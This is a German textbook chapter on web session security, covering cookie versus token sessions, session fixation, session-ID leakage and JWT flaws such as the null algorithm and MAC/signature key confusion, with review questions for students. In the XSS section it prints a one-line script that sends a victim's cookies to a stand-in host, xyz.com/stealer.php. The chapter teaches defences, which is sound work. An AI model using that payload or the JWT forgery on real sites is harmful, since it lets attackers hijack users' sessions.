# Session Management

Eine Session ist eine stehende Verbindung zwischen einem Client und
einem Server. Innerhalb der Session kann der Server Zugriffe einem
Client zuordnen. Nach erfolgtem Login kennt der Server also die
Benutzeridentität des Clients (bis zum erfolgten Logout). Im Web-Umfeld
werden zumeist Cookie-basierte Sessions verwendet, andere Möglichkeiten
wären z.B. Token basierte Systeme.

Token-basierte Systeme werden gerne zur Übertragung von
Zugangsberechtigungen für REST- oder SOAP-Webservices verwendet. Sofern
die Services state-less sind, ist dies eine sehr gute Kombination. In
diesem Fall werden alle notwendigen Session-/Benutzerinformationen im
Token transportiert, der Service selbst persistiert keine
State-Informationen. Durch diese funktionale Herangehensweise kann der
Service perfekt horizontal skalieren: wird mehr Performance benötigt,
werden weitere Service-Worker gestartet. Dies ist häufig bei Webservices
die durch Mobilapplikationen konsumiert werden der Fall, allerdings
seltener bei interaktiven Webapplikationen. Bei letzteren wird der Token
häufig als Session-Identifikatior missbraucht und dient zur
Identifikation einer serverseitigen Session — der Service ist also
state-ful. Um ein vollwertiges Session-System zu erlangen müssen
Programmierer nun dieses, basierend auf dem Token als Identifier, selbst
programmieren und erfinden daher quasi das Rad neu. Die Verwendung von
Token erbringt keine Vorteile mehr und sollte in diesem Fall diskutiert
werden. Ein häufiger Grund diesen Nachteil in Kauf zu nehmen ist, dass
zumindest Web- und Mobilapplikationen die idente serverseitige API
konsumieren können.

## Client- vs Server-Side Session

Mit Hilfe des Cookies kann der Server nun ein Session-Management Schema
implementieren. Prinzipiell gibt es nun die Unterscheidung in client-
und server-seitigem Session-Schemas.

Bei der client-seitigen Variante speichert der Server alle für die
Authentication relevanten Daten direkt im Cookie und versendet dieses an
den Client. Am Server selbst wird keine Session-Information gespeichert.
Bei jedem Folgezugriff inkludiert der Client dieses Cookie, der Server
interpretiert diese Daten und bildet anhand dieser die Benutzersession.
Bei diesem Verfahren sind mehrere Punkte problematisch:

- Der Client kann das Cookie beliebig verändern. Dadurch könnte z.B.
  ein im Cookie gespeicherter Benutzername auf “admin” geändert
  werden. Der Server kann dies umgehen, indem er das Cookie signiert
  und dadurch dessen Integrität sichert.

- Der Client kann das Cookie auslesen, und dadurch Zugriff auf
  potentiell sensible Daten erhalten. Der Server kann dies umgehen,
  indem er das Cookie verschlüsselt und dadurch die Confidentiality
  der Daten gewährleistet.

- Der Server besitzt keine Möglichkeit serverseitig alle Sessions
  eines Benutzers zu invalidieren (sprich, alle Session eines
  Benutzers auszuloggen).

Bei einer server-seitigen Sessionimplementierung generiert der Server
eine eindeutige zufällige ID und speichert diese innerhalb des Cookies.
In einer serverseitigen Datenbank wird nun diese ID dem eingeloggten
Benutzer zugeordnet und potentiell noch weitere Metainformationen
(Zeitpunkt des Logins, IP-Adresse, etc.) gespeichert. Bei dieser Lösung
werden die im Client gespeicherten Daten minimiert und der Server
besitzt die Möglichkeit alle Sessions zu beenden (indem er die Einträge
des Users aus der Session-Tabelle löscht).

Aus Sicherheitssicht sind server-seitige Sessions zu bevorzugen; einige
neuere Standards wie die österreichische ÖNORM A77.00 schreiben den
Einsatz von server-seitigen Sessions vor.

### Token-basierte Systeme für interaktive Sessions

Häufig werden client-seitige Token Systeme als direkte Alternative zu
Cookie-Session-basierten Systemen angepriesen. Als Vorteil wird zumeist
ihre bessere Skalierbarkeit (wenn nur Token-gespeicherte Daten für eine
Operation benötigt werden, wird kein Datenbank-Zugriff benötigt) und
Sicherheit (durch die Verwendung von Kryptographie) angepriesen. Diese
Begründung macht leider zumeist nur begrenzt Sinn.

Bei den meisten Operationen bei denen eine Autorisation überprüft wird,
benötigen eine Form des Datenbankzugriffs da zusätzliche Daten zu den,
im Token gespeicherten, Daten benötigt werden. Dadurch wird der
Skalierbarkeits-Vorteil entkräftet. Zusätzlich ist bei jedem Zugriff
eine, potentiell teure, kryptographische Operation notwendig. Die
Verwendung von Kryptographie innerhalb des Tokens ist orthogonal zu der
Gesamtsicherheit der Webapplikation. Eine Cookie-basierte client-seitige
Lösung kann ebenso eine Signatur (bzw. einen MAC[1]) verwenden um die
Integrität der Daten zu gewährleisten. Eine server-seitige
Cookie-basierte Sessionlösung würde diese Überprüfung nicht benötigen,
dafür allerdings einen kryptographischen Zufallszahlengenerator zur
Generierung der Session-Id verwenden.

Negativ für die Sicherheit ist das Fehlen einer server-seitigen
Session-Komponente. Wie kann eine kompromittierte Session server-seitig
invalidiert werden? Die naive Lösung, den privaten server-seitigen
Schlüssel, der zur Erstellung des MACs/der Signatur des Tokens verwendet
wird, zu tauschen ist nicht praktikabel, da dadurch alle aktiven
Sessions ungültig werden würden. Wird eine server-seitige Blacklist
geführt, wird aus dem Token auf einer logischen Ebene eine
server-seitige Session: der Entwickler hat nun das Rad neu erfunden und
dabei wahrscheinlich neue Bugs eingebaut.

Wird eine Kombination von kurzlebigen Access-, und langlebigen
Refresh-Tokens verwendet, wird dadurch das verwundbare Zeitfenster nur
reduziert und eine Angreifer muss nur das Refresh- statt dem
Access-Token entwenden um den selben Effekt zu erreichen. Wird beim
Neuausstellen des Access-Tokens mittels des Refresh-Tokens das Token
gegen eine Blacklist verglichen, hat der Entwickler wieder quasi
server-seitige Sessions neu erfunden.

Token-basierte Systeme sind gut dafür geeignet, Clients im Auftrag des
Users Zugriff auf Operationen und Daten zu erlauben. Dies kann z.B. eine
third-party Webseite oder eine Mobilapplikation sein. Für interaktive
Webseiten sind sie potentiell suboptimal da sich die Entwickler Gedanken
um die Revocation ausgestellter Tokens machen müssen. Synergie-Gründe
(die gleiche API kann von einer Webapplikation als auch von mobilen
Applikation verwendet werden) können eine Token-basierte Lösung
interessant machen, in diesem Fall müssen allerdings die Vor- und
Nachteile der selbst-implementierten Revocation abgewogen werden.

### ViewState

Das ViewState-pattern speichert den aktuellen Status der View (z.B.
eingegebene Daten, Verlaufshistorie, aktuell verfügbare Operationen)
innerhalb des ViewStates, z.B. als hidden Parameter innerhalb jedes
Formulars. Da der ViewState am Client gespeichert wird, muss der Server
sich um den Integritäts- und Confidentiality-Schutz kümmern.

Bei jeder Operation wird der ViewState vom Browser dem Server übergeben.
Dieser überprüft die Integrität des ViewStates, verifiziert dass der
ViewState mit der gewünschten Operation kompatibel ist, führt danach die
Operation aus und aktualisiert den ViewState. Dieser wird dann innerhalb
der nächsten Formulare wieder als hidden field eingetragen.

## Idealer Sessionablauf

Der Soll-Session-Lifecycle wäre:

1. Benutzer führt ein Login durch. Während des erfolgreichem Logins
   wird eine neue zufällige Session-Id am Server mittels eines
   kryptographisch-sicheren Zufallsgenerator generiert, und dem Client
   auf sicherem Weg mitgeteilt.

2. Der eingeloggte Benutzer führt nun mehrere Operationen aus. Der
   Browser des Benutzers inkludiert das Session-Cookie bei jedem
   Zugriff.

3. Vor dem Zugriff auf sensible Operationen oder Daten wird überprüft,
   ob die Session-Id noch aktiv ist. Der logische Benutzer wird der
   Session zugeordnet und die Applikation führt Überprüfung der
   Benutzeridentität und -berechtigung durch.

4. Während des Logouts wird sowohl server-seitig als auch client-seitig
   das Session-Cookie gelöscht und damit die Session auf beiden Seiten
   invalidiert.

## Potentielle Probleme beim Session-Management

Während der ideale Sessionverlauf relativ einfach aussieht, können dabei
mehrere sicherheitsrelevante Probleme auftreten:

### Session-Id wird verloren

Die Session-ID dient als Erkennungsmerkmal eines Benutzers. Wenn ein
Angreifer die Session-Id erlangt, kann er die Identität des Benutzers am
Server übernehmen.

Am einfachsten gelingt dies, wenn der Server nicht HTTPS verwendet. In
diesem Fall benötigt der Angreifer nur Zugriff auf die Transportdaten
(z.B. mittels Sniffing im gleichen WLAN ohne Client-Separation). Der
Angreifer kann nun seine Session-Id mit der des Opfers ersetzen und
übernimmt auf diese Weise dessen Identität.

Aus diesem Grund sollten Webseiten nur mehr mittels HTTPS angeboten
werden und auch automatisch HTTP Aufrufe auf HTTPS umleiten. Da zumeist
Webseiten sowohl über HTTP und HTTPS angeboten werden, kann es zu
Problemen kommen: z.B. könnte ein unbedarfter Benutzer eine HTTP Adresse
in einem Browser eingeben. In diesem Fall übermittelt der Browser
automatisch bei diesem ungesicherten Request das Session-Cookie. Während
er danach automatisch vom Server auf HTTPS umgeleitet wird, ist dies
bereits zu spät da bei dem ersten ungesicherten Request schon das Cookie
disclosed wurde.

Eine Lösung für dieses Problem bietet das secure-Flag das bei einem
Cookie gesetzt werden kann. Dieses Flag unterrichtet den Webbrowser,
dass das Cookie nur mittels HTTPS übertragen werden darf. Im Fall einer
HTTP Operation wird die Operation durch den Browser ohne Cookie
durchgeführt. Die Verbindungssicherheit kann ebenso durch die Verwendung
des HSTS-Headers bzw. durch Einsatz bestimmter CSP-Direktiven
sichergestellt werden.

### Mixed-Content / FireSheep

Die Verwendung von sowohl HTTP als auch HTTPS innerhalb einer Seite ist
ebenso problematisch. Dieses Pattern war um das Jahr 2010/11 stark
verbreitet, u.a. von Seiten wie Facebook, Twitter und Flickr. In diesem
Fall war nur die Login und Logout Operation mittels HTTPS geschützt,
weitere Inhalte wurde mittels HTTP übertragen. Die Begründung war, dass
sensible Daten (Benutzername und Passwort) verschlüsselt werden und
keine sensiblen Daten in den übertragenen Seiten enthalten sind[2].
Hauptgrund dafür war gering verfügbare Rechenkapazität und die relativ
"teure" Verschlüsselung (also schlussendlich Kosten).

Dies ist natürlich problematisch, da ein Angreifer mit Zugriff auf die
Netzwerkdaten die Session-Id extrahieren und dadurch die serverseitige
Identität übernehmen kann. Dies wurde eindrucksvoll mittels FireSheep
gezeigt: diese Firefox-Erweiterung zeigte in einer SideBar alle
erkannten Sessions an, der Anwender konnte durch Click auf die Sidebar
die jeweilige Session im Browser aktivieren. Aufgrund der Publicity
dieses Tools fingen Seiten schnell an, HTTPS durchgängig zu
implementieren. Eine weitere Firefox Erweiterung die in Reaktion darauf
erschien war HTTP Everywhere (erzwingt den Einsatz von HTTPS wenn eine
Seite sowohl über HTTP und HTTPS verfügbar ist).

### Session-Id in GET-Parameter

Sensible Daten sollten niemals als Teil der URL bzw. über HTTP GET
Parameter übertragen werden. Dies gilt auch für die Session-Id.

Welche Probleme können bei der Verwendung als GET Parameter auftreten?

- Die Session-Id ist Teil der URL und wird mit hoher
  Wahrscheinlichkeit in Web-Proxies und Web-Server Logdateien
  gespeichert.

- Die URL inklusive der GET Parameter sind Teil der Browser Historie.
  Durch Fehler in Browsern können Fremdseiten teilweise auf die
  Browserhistorie zugreifen.

- GET Parameter werden teilweise von Site Analysis Tools verwendet.
  Dies würde implizieren, dass z.B. bei Verwendung von Google
  Analytics alle Session-IDs an Alphabet weitergeleitet werden.

- Wird ein Cookie als Teil der URL verwendet, wird dieser Session-Wert
  im Normalfall über den Referer-Header übertragen. Auf diese Weise
  würde jede besuchte externe Webseite diesen Session-Wert.

Anstatt des GET-Parameters sollte die Cookie-basierte HTTP Session
verwendet werden. Falls dies nicht möglich ist, sollte ein HTTP POST
statt GET verwendet werden. Während dies die Gefährdung durch einen
bösartigen Angreifer nicht minimiert, verringert es das Fehlerrisiko.

### Session-Id ist vorher bestimmbar

Eine Session-Id muss eine zufällig generierte Zahl sein, dies impliziert
die Verwendung eines kryptographischen Zufallszahlengenerators.
Beispiele für schlecht gewählte Session-Ids wären:

- Aufsteigende Zahlen

- Verwenden eines Hashs über erratbare Eingangswerte:
  *hash(Systemzeit)*, *hash(username)*, *hash(username:password)*.

- Verwenden eines MACs über konstante Daten: *mac(username)*,
  *mac(username:password)*

- mac(systemzeit) — mittels NTP Angriffe kann versucht werden, die
  Zeit des Servers in die Vergangenheit zu bewegen.

- Verwendung eines nicht-kryptographisch sicheren
  Zufallszahlengenerator (z.B. *java.util.Random* statt
  *java.security.SecureRandom* in Java).

Während eines Pen-Tests würde die Zufälligkeit der Session-Id getestet
werden. Dies geschieht indem man sich mehrere Tausend Male einloggt und
mittels statistischer Methoden die Zufälligkeit und Entropie der
Session-Id analysiert.

### Session Fixation

Ein weiteres Problem besteht, wenn der Angreifer eine Session-Id dem
Clientbrowser vorschreiben kann bzw. eine konstante Session-Id bekannt
ist.

Letzteres passiert, wenn die Webapplikation beim ersten Zugriff eines
Browsers eine Session-Id vergibt und diese während des Logins nicht neu
setzt. Im einfachsten Fall würde ein Angreifer kurz Zugriff auf den
Browser des Opfers erhalten (z.B. durch einen nicht gesperrten PC
innerhalb eines Büros), die Zielwebseite besuchen und den Wert des
Session Cookies aufzeichnen. Wenn sich nun (Stunden später) das Opfer
einloggt, kennt der Angreifer bereits den Wert des Session-Cookies und
kann auf diese Weise die Session übernehmen.

Alternativ: unter der Annahme, dass die Webseite zusätzlich eine
Operation besitzt bei der das Session-Cookie mittels HTTP GET Parameter
übergeben wird. In dem Fall kann der Angreifer einen Social Engineering
Angriff durchführen. Er verschickt Emails mit Links auf die betreffende
Operation mit zufällig generierten Session-Ids. Wenn ein Opfer nun auf
diese Operation zugreift, erkennt der Webserver, dass das Opfer nicht
eingeloggt ist und leitet das Opfer zum Login-Dialog. Das Opfer logt
sich ein, der Webserver übernimmt die Session-Id. Der Angreifer muss nur
periodisch testen, ob mit einer der versendeten Session-Ids ein Login
möglich ist.

### Session-Extraktion mittels XSS-Lücke

Mittels Javascript kann auf Session-Cookies zugegriffen werden. Falls
die Webseite eine (der häufigen) XSS-Lücken[3]) besitzt kann ein
Angreifer nun Javascript-Code auf der Webseite platzieren, warten bis
ein anderer Benutzer darauf zugreift und mittels des Javascript-Codes
die Session-Id auf einen externen Server übermitteln. Dieser
Angriffsvektor macht vor allem Spaß, wenn eine Nachrichtenfunktion
innerhalb einer Applikation verwundbar ist, da man dadurch einzelne
Benutzer direkt anvisieren kann.

Beispiel für ein einfaches Javascript-Fragment welches ein Redirect auf
einen externen Server (xyz.com) durchführt und als GET-Parameter die
aktuellen Cookies übergibt:

```html
<script>location.href = 'http://xyz.com/stealer.php?cookie='+document.cookie;
</script>
```

Folgende Gegenmaßnahmen sollten implementiert werden:

- keine XSS-Lücke in der Webseite implementieren…

- durch Verwendung des httpOnly-Cookie Flags kann dem Webbrowser
  mitgeteilt werden, dass der Zugriff mittels Javascript auf das
  Session Cookie nicht erlaubt ist.

- CSP bietet Möglichkeiten XSS-Angriffe einzuschränken.

## JSON Web Tokens

JSON Web Tokens (JWT) sind standardisierte (RFC 7519) Tokens die als
HTTP Parameter, HTTP Session Cookies oder mittels eines HTTP Headers
übertragen werden können. Ein JSON Web-Token besteht aus drei Bereichen:

- Header: dieser Bereich speichert vor allem den verwendeten
  Algorithmus zur Erstellung des Integrity Checks.

- Content: JSON-Dokument welches die eigentliche Payload des Tokens
  ist. Es gib hier mehre vordefinierte optionale Werte: *iss*
  beschreibt den Issuer/Aussteller des Tokens, *sub* beschreibt das
  Subjekt des tokens, *aud* die geplante Audience (welche Server
  sollen das Token erhalten), *exp* und *nbf* den Gültigkeitszeitraum
  des tokens, *iat* den Ausstellungszeitpunkt.

- Integrity Check: der integrity check verwendet den, im *alg*-Header
  definierten Algorithmus über *header* und *content* um eine
  Checksumme zu bilden.

Die Gesamtstruktur des Tokens ist:

```text
verification = algorithm(base64(header) + "." + base64(content))
token = base64(header) + "." + base64(content) + "." + base64(hash)
```

Ein Beispiel für einen Token (man kann dabei die drei durch einen .
getrennten Base64-Bereiche erkennen. Da es sich um encoded JSON handelt,
beginnen die beiden ersten Base64-Blöcke immer mit *eyJ*):

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Problem: Null-Algorithmus

Ein grundlegendes Problem bei JWT ist, dass die Checksumme nur über den
*content* Bereich berechnet wird. Der gesamte *header* Bereich wird
nicht integritätsgeschützt. Dies erlaubt es einem Angreifer, die in dem
Header vorhandenen Metadaten beliebig zu verändern.

Ein einfacher Angriff gegenüber JWT das Setzen des *alg* Parameters
innerhalb des Headers auf den *NULL*-Algorithmus. Dies bedeutet, dass
keine Checksumme berechnet, und der dritte Part des JWTs einfach leer
bleibt. Dadurch kann der Angreifer den content nun beliebig wählen und
verletzt dabei trotzdem keine Integritätsregeln.

### Probleme bei MAC-basierter Verifizierung

Wenn ein Angreifer einen ausgestellten JWT empfängt (weil er z.B. ein
Benutzer einer Webapplikation ist) besitzt er die Möglichkeit, einen
Offline-Brute Force Angriff gegen den Token durchzuführen. Der Angreifer
besitzt die Eingangsdaten für den MAC (die Base64-codierten *header* und
*content* Bereiche des Tokens) und kann nun mittels eines Brute-Force
Angriffs versuchen, den Schlüssel des MACs zu erraten.

Aus diesem Grund muss bei Einsatz eines MACs immer ein sehr sicherer
Schlüssel gewählt werden.

### Problem: MAC vs. Signature

Ein weiteres Problem tritt bei einer Confusion betreffend dem
verwendeten Verfahren zur Berechnung der Prüfsumme (dritter Bereich des
Tokens) auf. Hier gibt es die Möglichkeit, dass ein Public-Key basiertes
Verfahren zur Erstellung einer Signatur oder ein shared-key basiertes
Verfahren zur Erstellung eines MACs verwendet wird.

Die Methode zur Verifikation eines Tokens wird folgend aufgerufen:

```text
validate(token, key)
```

Als erster Parameter wird das zu verifizierende Token übergeben, als
zweiter Parameter wird der zu verwendende Key übergeben. Bei einem
Signature-basierten Verfahren würde hier der public-key übergeben (da
die Signatur ja mittels des public-Keys verifiziert wird), bei einem
MAC-basierten Verfahren wird hier der shared private key übergeben (der
für die Berechnung des MACs benötigt wird). Die Selektion des Verfahrens
geschieht über den *alg* Parameter im Header des Tokens. Wird ein
Signatur-basiertes Verfahren gewählt, ist der Public-Key fast immer
öffentlich verfügbar.

Ein Problem tritt nun auf, wenn der Entwickler eines Services davon
ausgeht, dass der Client immer ein Signatur-basiertes Verfahren
verwenden wird. In dem Fall würde eine naive Implementierung folgenden
Code wählen:

```text
# assume that token is an signature-based token
validate(token, public-key)
```

Es wird also der public key verwendet um die Signatur zu überprüfen.

Ein Angreifer kann nun den public key herunterladen und selbst ein neues
Token erstellen. Bei diesem setzt er den *alg* Wert auf *MAC*, generiert
also ein MAC-basiertes Token. Als geheimen Schlüssel für dieses Token
verwendet er den public key der für die Überprüfung der Signatur
verwendet wird. Wenn er nun dieses Token an den Service übergibt wird
folgendes Code-Fragment aufgerufen:

```text
# token ist ein MAC-basiertes token
# die validate Funktion wird deswegen versuchen
# einen MAC zu berechnen und verwendet dafür
# den zweiten Parameter (public-key)
validate(token, public-key)
```

Da der Server (hardcoded) annimmt, dass eine Signatur überprüft wird,
wird der public key (den der Angreifer zum Erstellen des MACs verwendet
hat) als Schlüssel übergeben. Die validate Funktion liest nun das Token,
erkennt, dass dieses MAC-basiert ist und verwendet nun den übergebenen
Schlüssel um einen MAC zu berechnen. Dieser ist nun ident zu dem MAC den
der Angreifer gespeichert hat und die Operation wird aufgerufen, obwohl
der Angreifer darauf keinen Zugriff erhalten sollte.

Dieses Problem zeigt, dass der Entwickler des Webservices immer
sicherstellen muss, dass das Token den erwarteten Algorithmus (in diesem
Fall einen Signatur-basierten Algorithmus) verwendet. Falls das Token
hier einen anderen Algorithmus verwendet hat, muss das Token verworfen
werden.

## Reflektionsfragen

1. Was versteht man unter einem Session-Fixation Angriff?

2. Erkläre client- und server-seitige Session-Konzepte. Welche Variante
   sollte man aus Sicherheitsgründen wählen und erläutere dies.

3. Wie sieht ein guter Umgang mit einer Session aus? Wann wird diese
   angelegt, wann gelöscht. Wie sollte sie implementiert werden?

4. Welche sicherheits-relevenaten Probleme gibt es im Zusammenhang von
   Mixed-Content und Session-IDs?

5. Warum sollten Session-ID nie innerhalb der URL (bzw. als HTTP
   GET-Parameter) verwendet werden?

[1] *Message Authentication Code*

[2] Ja, es war eine einfachere Zeit. Mittlerweile würde der Inhalt eines
Facebook-Kontos auch als kritisch eingeschätzt werden.

[3] Siehe auch das XSS-Kapitel
